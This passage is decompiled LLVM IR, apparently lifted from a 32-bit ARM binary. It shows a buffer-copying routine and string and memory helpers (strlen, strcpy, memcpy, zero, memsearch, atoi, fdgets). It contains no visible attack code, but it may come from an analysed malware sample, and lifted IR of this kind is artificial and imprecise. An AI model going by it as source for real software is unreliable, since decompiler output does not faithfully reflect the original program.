  %v0_123b4 = load i32, i32* @r8, align 4
  store i32 %v0_123ac, i32* @r5, align 4
  %v3_123bc = call i32 @util_memcpy(i32 %v0_123ac, i32 ptrtoint (i32* @global_var_1ba8c.616 to i32), i32 %v0_123b4)
  %v0_123c4 = load i32, i32* @sb, align 4
  store i32 %v0_123c4, i32* @r0, align 4
  %v0_123c8 = load i32, i32* @r8, align 4
  %v1_123c8 = trunc i32 %v0_123c8 to i16
  %v2_123c8 = load i32, i32* @r4, align 4
  %v4_123c8 = add i32 %v2_123c8, 492
  %v5_123c8 = inttoptr i32 %v4_123c8 to i16*
  store i16 %v1_123c8, i16* %v5_123c8, align 2
  %v0_123cc = load i32, i32* @r5, align 4
  store i32 %v0_123cc, i32* @global_var_273c8.756, align 4
  %v0_123d0 = call i32 @malloc()
  %v0_123d8 = load i32, i32* @sb, align 4
  store i32 %v0_123d0, i32* %r5.global-to-local, align 4
  %v4_123e0 = call i32 @util_memcpy(i32 %v0_123d0, i32 ptrtoint ([11 x i8]* @global_var_1bf04.758 to i32), i32 %v0_123d8)
  %v0_123e8 = load i32, i32* @sb, align 4
  %v1_123e8 = trunc i32 %v0_123e8 to i16
  %v2_123e8 = load i32, i32* @r4, align 4
  %v4_123e8 = add i32 %v2_123e8, 500
  %v5_123e8 = inttoptr i32 %v4_123e8 to i16*
  store i16 %v1_123e8, i16* %v5_123e8, align 2
  %v0_123ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_123ec, i32* @global_var_273d0.759, align 4
  store i32 %v3_11b5c, i32* @r4, align 4
  store i32 %v6_11b5c, i32* @r5, align 4
  store i32 %v9_11b5c, i32* @r6, align 4
  store i32 %v12_11b5c, i32* @r7, align 4
  store i32 %v15_11b5c, i32* @r8, align 4
  store i32 %v21_11b5c, i32* @sl, align 4
  store i32 %v24_11b5c, i32* @fp, align 4
  ret i32 %v4_123e0

; uselistorder directives
  uselistorder i32 %v0_123d0, { 1, 0 }
  uselistorder i32 %v0_123ac, { 1, 0 }
  uselistorder i32 %v0_12388, { 1, 0 }
  uselistorder i32 %v0_1233c, { 1, 0 }
  uselistorder i32 %v0_12318, { 1, 0 }
  uselistorder i32 %v0_122c8, { 1, 0 }
  uselistorder i32 %v0_122a4, { 1, 0 }
  uselistorder i32 %v0_1222c, { 1, 0 }
  uselistorder i32 %v0_12208, { 1, 0 }
  uselistorder i32 %v0_121e4, { 1, 0 }
  uselistorder i32 %v0_121c0, { 1, 0 }
  uselistorder i32 %v0_12174, { 1, 0 }
  uselistorder i32 %v0_12128, { 1, 0 }
  uselistorder i32 %v0_12100, { 1, 0 }
  uselistorder i32 %v0_12064, { 1, 0 }
  uselistorder i32 %v0_11ff0, { 1, 0 }
  uselistorder i32 %v0_11fcc, { 1, 0 }
  uselistorder i32 %v0_11f7c, { 1, 0 }
  uselistorder i32 %v0_11f34, { 1, 0 }
  uselistorder i32 %v0_11f14, { 1, 0 }
  uselistorder i32 %v0_11ed0, { 1, 0 }
  uselistorder i32 %v0_11e8c, { 1, 0 }
  uselistorder i32 %v0_11e6c, { 1, 0 }
  uselistorder i32 %v0_11e4c, { 1, 0 }
  uselistorder i32 %v0_11de4, { 1, 0 }
  uselistorder i32 %v0_11dc4, { 1, 0 }
  uselistorder i32 %v0_11d80, { 1, 0 }
  uselistorder i32 %v0_11d5c, { 1, 0 }
  uselistorder i32 %v0_11d38, { 1, 0 }
  uselistorder i32 %v0_11d14, { 1, 0 }
  uselistorder i32 %v0_11cac, { 1, 0 }
  uselistorder i32 %v0_11c88, { 1, 0 }
  uselistorder i32 %v0_11c64, { 1, 0 }
  uselistorder i32 %v0_11bd4, { 1, 0 }
  uselistorder i32 %v0_11b90, { 1, 0 }
  uselistorder i32 %v0_11b68, { 1, 0 }
  uselistorder i32 284, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 23, { 0, 2, 3, 1, 4 }
  uselistorder i32 29, { 0, 9, 1, 6, 2, 7, 3, 8, 10, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_271e0.552 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_124e4 = load i8, i8* %arg1, align 1
  %v2_124e8 = icmp eq i8 %v3_124e4, 0
  %v0_124ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_124e8, i32 %v0_124ec)
  br label %dec_label_pc_124f4

dec_label_pc_124f4:                               ; preds = %dec_label_pc_124f4, %entry
  %v0_124f4 = phi i32 [ %v1_124f4, %dec_label_pc_124f4 ], [ 0, %entry ]
  %v1_124f4 = add i32 %v0_124f4, 1
  %v2_124f8 = add i32 %v1_124f4, %tmp
  %v3_124f8 = inttoptr i32 %v2_124f8 to i8*
  %v4_124f8 = load i8, i8* %v3_124f8, align 1
  %v6_124f8 = zext i8 %v4_124f8 to i32
  store i32 %v6_124f8, i32* @r3, align 4
  %v2_124fc = icmp eq i8 %v4_124f8, 0
  br i1 %v2_124fc, label %dec_label_pc_12504, label %dec_label_pc_124f4

dec_label_pc_12504:                               ; preds = %dec_label_pc_124f4
  ret i32 %v1_124f4
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_12508 = load i8, i8* %arg1, align 1
  %v3_12508 = zext i8 %v2_12508 to i32
  %v2_1250c = icmp eq i8 %v2_12508, 0
  br i1 %v2_1250c, label %bb, label %dec_label_pc_12518

bb:                                               ; preds = %entry
  store i32 %v3_12508, i32* @ip, align 4
  br label %dec_label_pc_1252c

dec_label_pc_12518:                               ; preds = %entry
  br label %dec_label_pc_1251c

dec_label_pc_1251c:                               ; preds = %dec_label_pc_1251c, %dec_label_pc_12518
  %v0_1251c = phi i32 [ %v1_1251c, %dec_label_pc_1251c ], [ 0, %dec_label_pc_12518 ]
  %v1_1251c = add i32 %v0_1251c, 1
  store i32 %v1_1251c, i32* @ip, align 4
  %v2_12520 = add i32 %v1_1251c, %tmp
  %v3_12520 = inttoptr i32 %v2_12520 to i8*
  %v4_12520 = load i8, i8* %v3_12520, align 1
  %v2_12524 = icmp eq i8 %v4_12520, 0
  br i1 %v2_12524, label %dec_label_pc_1252c, label %dec_label_pc_1251c

dec_label_pc_1252c:                               ; preds = %dec_label_pc_1251c, %bb
  %v0_1252c = phi i32 [ %v3_12508, %bb ], [ %v1_1251c, %dec_label_pc_1251c ]
  br label %dec_label_pc_12538

dec_label_pc_12534:                               ; preds = %dec_label_pc_12538
  %v0_12534 = load i32, i32* @r1, align 4
  %v1_12534 = add i32 %v0_12534, 1
  %v2_12534 = inttoptr i32 %v1_12534 to i8*
  %v3_12534 = load i8, i8* %v2_12534, align 1
  store i32 %v1_12534, i32* @r1, align 4
  %v0_12538.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_12538

dec_label_pc_12538:                               ; preds = %dec_label_pc_1252c, %dec_label_pc_12534
  %v0_12540.off0 = phi i8 [ %v2_12508, %dec_label_pc_1252c ], [ %v3_12534, %dec_label_pc_12534 ]
  %v0_12538 = phi i32 [ %v0_1252c, %dec_label_pc_1252c ], [ %v0_12538.pr, %dec_label_pc_12534 ]
  %v1_12538 = add i32 %v0_12538, -1
  store i32 %v1_12538, i32* @r3, align 4
  %v3_1253c = icmp eq i32 %v0_12538, 0
  %v2_12540 = load i32, i32* @r0, align 4
  %v3_12540 = inttoptr i32 %v2_12540 to i8*
  store i8 %v0_12540.off0, i8* %v3_12540, align 1
  %v4_12540 = load i32, i32* @r0, align 4
  %v5_12540 = add i32 %v4_12540, 1
  store i32 %v5_12540, i32* @r0, align 4
  br i1 %v3_1253c, label %dec_label_pc_12548, label %dec_label_pc_12534

dec_label_pc_12548:                               ; preds = %dec_label_pc_12538
  %v0_12548 = load i32, i32* @ip, align 4
  ret i32 %v0_12548

; uselistorder directives
  uselistorder i32 %v0_12538, { 1, 0 }
  uselistorder i32 %v1_1251c, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_12538, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_12550 = icmp eq i32 %arg3, 0
  %v0_12554 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12550, i32 %v0_12554)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1255c

dec_label_pc_1255c:                               ; preds = %dec_label_pc_1255c, %entry
  %v0_1255c = phi i32 [ %v1_12564, %dec_label_pc_1255c ], [ 0, %entry ]
  %v2_1255c = add i32 %v0_1255c, %arg2
  %v3_1255c = inttoptr i32 %v2_1255c to i8*
  %v4_1255c = load i8, i8* %v3_1255c, align 1
  %v4_12560 = add i32 %v0_1255c, %arg1
  %v5_12560 = inttoptr i32 %v4_12560 to i8*
  store i8 %v4_1255c, i8* %v5_12560, align 1
  %v0_12564 = load i32, i32* %ip.global-to-local, align 4
  %v1_12564 = add i32 %v0_12564, 1
  store i32 %v1_12564, i32* %ip.global-to-local, align 4
  %v9_12568 = icmp eq i32 %v1_12564, %arg3
  br i1 %v9_12568, label %dec_label_pc_12570, label %dec_label_pc_1255c

dec_label_pc_12570:                               ; preds = %dec_label_pc_1255c
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_12564, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v2_12574 = icmp eq i32 %arg2, 0
  %v0_12578 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12574, i32 %v0_12578)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12580

dec_label_pc_12580:                               ; preds = %dec_label_pc_12580, %entry
  %v2_12584 = phi i32 [ %v1_12588, %dec_label_pc_12580 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v4_12584 = add i32 %v2_12584, %arg1
  %v5_12584 = inttoptr i32 %v4_12584 to i8*
  store i8 0, i8* %v5_12584, align 1
  %v0_12588 = load i32, i32* %r2.global-to-local, align 4
  %v1_12588 = add i32 %v0_12588, 1
  store i32 %v1_12588, i32* %r2.global-to-local, align 4
  %v9_1258c = icmp eq i32 %v1_12588, %arg2
  br i1 %v9_1258c, label %dec_label_pc_12594, label %dec_label_pc_12580

dec_label_pc_12594:                               ; preds = %dec_label_pc_12580
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_12588, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_125ac = icmp sgt i32 %arg4, %arg2
  br i1 %v7_125ac, label %dec_label_pc_125b4, label %dec_label_pc_125bc

dec_label_pc_125b4:                               ; preds = %dec_label_pc_125d0, %dec_label_pc_125bc, %entry, %dec_label_pc_125fc
  %storemerge = phi i32 [ %v1_125fc, %dec_label_pc_125fc ], [ -1, %entry ], [ -1, %dec_label_pc_125bc ], [ -1, %dec_label_pc_125d0 ]
  ret i32 %storemerge

dec_label_pc_125bc:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_125b4, label %dec_label_pc_125c4

dec_label_pc_125c4:                               ; preds = %dec_label_pc_125bc
  br label %dec_label_pc_125dc

dec_label_pc_125d0:                               ; preds = %bb, %dec_label_pc_125f0
  %v1_125dc3 = phi i32 [ %v1_125f0, %dec_label_pc_125f0 ], [ 0, %bb ]
  %v1_125d0 = add i32 %v0_125fc, 1
  %v9_125d4 = icmp eq i32 %v1_125d0, %arg2
  br i1 %v9_125d4, label %dec_label_pc_125b4, label %dec_label_pc_125dc

dec_label_pc_125dc:                               ; preds = %dec_label_pc_125d0, %dec_label_pc_125c4
  %v0_125fc = phi i32 [ %v1_125d0, %dec_label_pc_125d0 ], [ 0, %dec_label_pc_125c4 ]
  %v1_125dc = phi i32 [ %v1_125dc3, %dec_label_pc_125d0 ], [ 0, %dec_label_pc_125c4 ]
  %v2_125dc = add i32 %v1_125dc, %arg3
  %v3_125dc = inttoptr i32 %v2_125dc to i8*
  %v4_125dc = load i8, i8* %v3_125dc, align 1
  %v2_125e0 = add i32 %v0_125fc, %arg1
  %v3_125e0 = inttoptr i32 %v2_125e0 to i8*
  %v4_125e0 = load i8, i8* %v3_125e0, align 1
  %v9_125e4 = icmp eq i8 %v4_125e0, %v4_125dc
  br i1 %v9_125e4, label %dec_label_pc_125f0, label %bb

bb:                                               ; preds = %dec_label_pc_125dc
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_125d0

dec_label_pc_125f0:                               ; preds = %dec_label_pc_125dc
  %v1_125f0 = add i32 %v1_125dc, 1
  store i32 %v1_125f0, i32* @ip, align 4
  %v9_125f4 = icmp eq i32 %v1_125f0, %arg4
  br i1 %v9_125f4, label %dec_label_pc_125fc, label %dec_label_pc_125d0

dec_label_pc_125fc:                               ; preds = %dec_label_pc_125f0
  %v1_125fc = add i32 %v0_125fc, 1
  br label %dec_label_pc_125b4

; uselistorder directives
  uselistorder i32 %v1_125f0, { 1, 2, 0 }
  uselistorder i32 %v1_125dc, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_125d0, { 1, 0 }
  uselistorder label %dec_label_pc_125b4, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_12614

dec_label_pc_12614:                               ; preds = %.thread, %dec_label_pc_12628, %bb, %entry
  %v0_12614 = phi i32 [ %tmp, %entry ], [ %v5_12614, %bb ], [ %v5_12614, %dec_label_pc_12628 ], [ %v5_12614, %.thread ]
  %v1_12614 = inttoptr i32 %v0_12614 to i8*
  %v2_12614 = load i8, i8* %v1_12614, align 1
  %v5_12614 = add i32 %v0_12614, 1
  %v7_12618 = icmp eq i8 %v2_12614, 9
  br i1 %v7_12618, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12614
  br label %dec_label_pc_12614

bb:                                               ; preds = %dec_label_pc_12614
  %v8_1261c = icmp eq i8 %v2_12614, 32
  br i1 %v8_1261c, label %dec_label_pc_12614, label %dec_label_pc_12628

dec_label_pc_12628:                               ; preds = %bb
  %v7_12628 = icmp eq i8 %v2_12614, 10
  br i1 %v7_12628, label %dec_label_pc_12614, label %dec_label_pc_12630

dec_label_pc_12630:                               ; preds = %dec_label_pc_12628
  %v7_12630 = icmp eq i8 %v2_12614, 45
  br i1 %v7_12630, label %dec_label_pc_12720, label %dec_label_pc_12638

dec_label_pc_12638:                               ; preds = %dec_label_pc_12630
  %v7_12638 = icmp eq i8 %v2_12614, 43
  br i1 %v7_12638, label %bb54, label %dec_label_pc_12648

bb54:                                             ; preds = %dec_label_pc_12638
  %v2_1263c = inttoptr i32 %v5_12614 to i8*
  %v3_1263c = load i8, i8* %v2_1263c, align 1
  %v6_1263c = add i32 %v0_12614, 2
  br label %dec_label_pc_12648

dec_label_pc_12648:                               ; preds = %bb54, %dec_label_pc_12638, %dec_label_pc_12720
  %v1_126f039 = phi i32 [ %v5_12720, %dec_label_pc_12720 ], [ %v5_12614, %dec_label_pc_12638 ], [ %v6_1263c, %bb54 ]
  %v0_1267010.in = phi i8 [ %v2_12720, %dec_label_pc_12720 ], [ %v2_12614, %dec_label_pc_12638 ], [ %v3_1263c, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_12720 ], [ 2147483647, %dec_label_pc_12638 ], [ 2147483647, %bb54 ]
  %v0_12730 = phi i32 [ 1, %dec_label_pc_12720 ], [ 0, %dec_label_pc_12638 ], [ 0, %bb54 ]
  %v2_12650 = udiv i32 %storemerge1, %arg2
  %v3_12650 = urem i32 %storemerge1, %arg2
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_12670.outer

dec_label_pc_12670.outer:                         ; preds = %.thread5, %dec_label_pc_12648
  %v1_126f0.ph = phi i32 [ %v6_126f0, %.thread5 ], [ %v1_126f039, %dec_label_pc_12648 ]
  %v2_126ec.ph = phi i32 [ %v5_126ec, %.thread5 ], [ 0, %dec_label_pc_12648 ]
  %v1_126b0.ph.in = phi i8 [ %v3_126f0, %.thread5 ], [ %v0_1267010.in, %dec_label_pc_12648 ]
  %v1_126c8.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_12648 ]
  %v3_126bc = icmp uge i32 %v2_126ec.ph, %v2_12650
  %v9_126bc = icmp eq i32 %v2_126ec.ph, %v2_12650
  %v2_126c0 = xor i1 %v3_126bc, true
  %v3_126c0 = or i1 %v9_126bc, %v2_126c0
  %v2_126c4 = xor i1 %v9_126bc, true
  %v3_126c4 = and i1 %v3_126bc, %v2_126c4
  %v2_126e4 = icmp eq i1 %v9_126bc, false
  br label %dec_label_pc_12670

dec_label_pc_12670:                               ; preds = %dec_label_pc_12670.outer, %dec_label_pc_126f8
  %v1_126f0 = phi i32 [ %v5_126f8, %dec_label_pc_126f8 ], [ %v1_126f0.ph, %dec_label_pc_12670.outer ]
  %v1_126c8 = phi i32 [ -1, %dec_label_pc_126f8 ], [ %v1_126c8.ph, %dec_label_pc_12670.outer ]
  %v1_126b0.in = phi i8 [ %v2_126f8, %dec_label_pc_126f8 ], [ %v1_126b0.ph.in, %dec_label_pc_12670.outer ]
  %v1_126b0 = zext i8 %v1_126b0.in to i32
  %v1_12670 = urem i32 %v1_126b0, 256
  %v1_12674 = add nsw i32 %v1_12670, -48
  %v1_1267c = add nsw i32 %v1_12670, -97
  %v1_12680 = add nsw i32 %v1_126b0, -48
  %v1_12684 = add nsw i32 %v1_12670, -65
  %tmp87 = icmp ult i32 %v1_12674, 10
  br i1 %tmp87, label %dec_label_pc_126b4, label %dec_label_pc_1268c

dec_label_pc_1268c:                               ; preds = %dec_label_pc_12670
  %v2_1268c = icmp ugt i32 %v1_12684, 24
  %v7_1268c = icmp eq i32 %v1_12684, 25
  %v2_12690 = xor i1 %v7_1268c, true
  %v3_12690 = and i1 %v2_1268c, %v2_12690
  br i1 %v3_12690, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_1268c
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_1268c, %bb55
  %v0_126a415 = phi i32 [ %v1_12680, %dec_label_pc_1268c ], [ 0, %bb55 ]
  %v2_12694 = xor i1 %v2_1268c, true
  %v3_12694 = or i1 %v7_1268c, %v2_12694
  br i1 %v3_12694, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_126a4 = phi i32 [ %v0_126a415, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_12690, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_1269c = icmp ugt i32 %v1_1267c, 24
  %v11_1269c = icmp eq i32 %v1_1267c, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_126a0 = phi i1 [ %v7_1268c, %bb58 ], [ %v11_1269c, %bb59 ]
  %v0_126a0 = phi i1 [ %v2_1268c, %bb58 ], [ %v6_1269c, %bb59 ]
  %v2_126a0 = xor i1 %v1_126a0, true
  %v3_126a0 = and i1 %v0_126a0, %v2_126a0
  br i1 %v3_126a0, label %dec_label_pc_12704, label %dec_label_pc_126a4

dec_label_pc_126a4:                               ; preds = %bb60
  %v2_126a4 = icmp eq i32 %v0_126a4, 0
  %. = select i1 %v2_126a4, i32 87, i32 55
  %v2_126b0 = sub nsw i32 %v1_126b0, %.
  br label %dec_label_pc_126b4

dec_label_pc_126b4:                               ; preds = %dec_label_pc_12670, %dec_label_pc_126a4
  %v0_126c833 = phi i32 [ %v1_12684, %dec_label_pc_12670 ], [ %., %dec_label_pc_126a4 ]
  %v3_126ec = phi i32 [ %v1_12680, %dec_label_pc_12670 ], [ %v2_126b0, %dec_label_pc_126a4 ]
  %v2_126b4 = sub i32 %v3_126ec, %arg2
  %v4_126b4 = xor i32 %v3_126ec, %arg2
  %v5_126b4 = xor i32 %v2_126b4, %v3_126ec
  %v6_126b4 = and i32 %v5_126b4, %v4_126b4
  %v7_126b4 = icmp slt i32 %v6_126b4, 0
  %v8_126b4 = icmp slt i32 %v2_126b4, 0
  %v2_126b8 = xor i1 %v8_126b4, %v7_126b4
  br i1 %v2_126b8, label %dec_label_pc_126bc, label %dec_label_pc_12704

dec_label_pc_126bc:                               ; preds = %dec_label_pc_126b4
  br i1 %v3_126c0, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_126bc
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_126bc, %bb63
  %v0_126c832 = phi i32 [ %v0_126c833, %dec_label_pc_126bc ], [ 0, %bb63 ]
  br i1 %v3_126c4, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_126c8 = phi i32 [ %v0_126c832, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_126c8, 0
  %v4_126c8 = zext i1 %tmp88 to i32
  %v5_126c8 = or i32 %v0_126c8, %v4_126c8
  %v7_126c8 = icmp eq i32 %v5_126c8, 0
  br i1 %v7_126c8, label %dec_label_pc_126d0, label %dec_label_pc_126f8

dec_label_pc_126d0:                               ; preds = %bb66
  %v2_126dc = sub i32 %v3_126ec, %v3_12650
  %v4_126dc = xor i32 %v3_126ec, %v3_12650
  %v5_126dc = xor i32 %v2_126dc, %v3_126ec
  %v6_126dc = and i32 %v5_126dc, %v4_126dc
  %v7_126dc = icmp slt i32 %v6_126dc, 0
  %v8_126dc = icmp slt i32 %v2_126dc, 0
  %v9_126dc = icmp eq i32 %v3_126ec, %v3_12650
  %v3_126e0 = xor i1 %v8_126dc, %v7_126dc
  %v4_126e0 = or i1 %v9_126dc, %v3_126e0
  br i1 %v4_126e0, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_126d0
  store i32 1, i32* @ip, align 4
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_126d0
  store i32 1, i32* @ip, align 4
  br i1 %v2_126e4, label %.thread5, label %dec_label_pc_126f8

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_126ec = mul i32 %v2_126ec.ph, %arg2
  %v5_126ec = add i32 %v3_126ec, %v4_126ec
  %v2_126f0 = inttoptr i32 %v1_126f0 to i8*
  %v3_126f0 = load i8, i8* %v2_126f0, align 1
  %v6_126f0 = add i32 %v1_126f0, 1
  br label %dec_label_pc_12670.outer

dec_label_pc_126f8:                               ; preds = %thread-pre-split, %bb66
  %v1_126f8 = inttoptr i32 %v1_126f0 to i8*
  %v2_126f8 = load i8, i8* %v1_126f8, align 1
  %v5_126f8 = add i32 %v1_126f0, 1
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_12670

dec_label_pc_12704:                               ; preds = %dec_label_pc_126b4, %bb60
  %v1_12704 = icmp slt i32 %v1_126c8, 0
  %v2_12730 = icmp eq i32 %v0_12730, 0
  br i1 %v1_12704, label %dec_label_pc_12730, label %dec_label_pc_1270c

dec_label_pc_1270c:                               ; preds = %dec_label_pc_12704
  br i1 %v2_12730, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_1270c
  %v2_12710 = sub i32 0, %v2_126ec.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_1270c, %bb69
  %v1_1271c = phi i32 [ -2147483648, %bb71 ], [ %v2_126ec.ph, %dec_label_pc_1270c ], [ %v2_12710, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_1271c

dec_label_pc_12720:                               ; preds = %dec_label_pc_12630
  %v1_12720 = inttoptr i32 %v5_12614 to i8*
  %v2_12720 = load i8, i8* %v1_12720, align 1
  %v5_12720 = add i32 %v0_12614, 2
  br label %dec_label_pc_12648

dec_label_pc_12730:                               ; preds = %dec_label_pc_12704
  br i1 %v2_12730, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_12730
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_12730
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_12730, { 1, 0 }
  uselistorder i32 %v2_126dc, { 1, 0 }
  uselistorder i32 %v2_126b4, { 1, 0 }
  uselistorder i32 %v3_126ec, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_1268c, { 1, 2, 0 }
  uselistorder i1 %v2_1268c, { 1, 0, 2 }
  uselistorder i32 %v1_12670, { 1, 2, 0 }
  uselistorder i32 %v1_126b0, { 1, 0, 2 }
  uselistorder i32 %v1_126c8, { 1, 0 }
  uselistorder i32 %v1_126f0, { 2, 3, 1, 0 }
  uselistorder i1 %v9_126bc, { 1, 0, 2 }
  uselistorder i1 %v3_126bc, { 1, 0 }
  uselistorder i32 %v2_126ec.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_12650, { 1, 0, 2 }
  uselistorder i32 %v2_12650, { 1, 0 }
  uselistorder i32 %v5_12614, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_12614, { 0, 1, 3, 2 }
  uselistorder i32 25, { 11, 12, 0, 9, 1, 6, 2, 7, 3, 8, 5, 4, 10 }
  uselistorder i8 32, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 9, { 4, 0, 1, 2, 3 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_126b4, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_12670, { 1, 0 }
  uselistorder label %dec_label_pc_12648, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12614, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12740 = load i32, i32* @r4, align 4
  store i32 %v3_12740, i32* %stack_var_-24, align 4
  %v6_12740 = load i32, i32* @r5, align 4
  %v9_12740 = load i32, i32* @r6, align 4
  %v12_12740 = load i32, i32* @r7, align 4
  %v15_12740 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12758

dec_label_pc_12758:                               ; preds = %dec_label_pc_1277c.dec_label_pc_12758_crit_edge, %entry
  %v0_1275c = phi i32 [ %v0_1275c.pre, %dec_label_pc_1277c.dec_label_pc_12758_crit_edge ], [ %arg3, %entry ]
  %v0_12758 = phi i32 [ %v5_1277c, %dec_label_pc_1277c.dec_label_pc_12758_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_12758, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_12764 = call i32 @__libc_read(i32 %v0_1275c)
  %v7_12768 = icmp eq i32 %v1_12764, 1
  %v0_12770 = load i32, i32* @r5, align 4
  br i1 %v7_12768, label %dec_label_pc_12770, label %dec_label_pc_12788

dec_label_pc_12770:                               ; preds = %dec_label_pc_12758
  %v1_12770 = add i32 %v0_12770, 1
  store i32 %v1_12770, i32* @r5, align 4
  %v1_12774 = load i32, i32* @r8, align 4
  %v6_12778 = icmp slt i32 %v1_12770, %v1_12774
  br i1 %v6_12778, label %dec_label_pc_1277c, label %.loopexit

dec_label_pc_1277c:                               ; preds = %dec_label_pc_12770
  %v0_1277c = load i32, i32* @r4, align 4
  %v1_1277c = inttoptr i32 %v0_1277c to i8*
  %v2_1277c = load i8, i8* %v1_1277c, align 1
  %v3_1277c = zext i8 %v2_1277c to i32
  store i32 %v3_1277c, i32* @r3, align 4
  %v5_1277c = add i32 %v0_1277c, 1
  store i32 %v5_1277c, i32* @r4, align 4
  %v7_12780 = icmp eq i8 %v2_1277c, 10
  br i1 %v7_12780, label %dec_label_pc_12788, label %dec_label_pc_1277c.dec_label_pc_12758_crit_edge

dec_label_pc_1277c.dec_label_pc_12758_crit_edge:  ; preds = %dec_label_pc_1277c
  %v0_1275c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12758

dec_label_pc_12788:                               ; preds = %dec_label_pc_12758, %dec_label_pc_1277c
  %v0_12788 = phi i32 [ %v1_12770, %dec_label_pc_1277c ], [ %v0_12770, %dec_label_pc_12758 ]
  %v2_12788 = icmp eq i32 %v0_12788, 0
  br i1 %v2_12788, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_12788
  store i32 0, i32* @r7, align 4
  br label %.loopexit

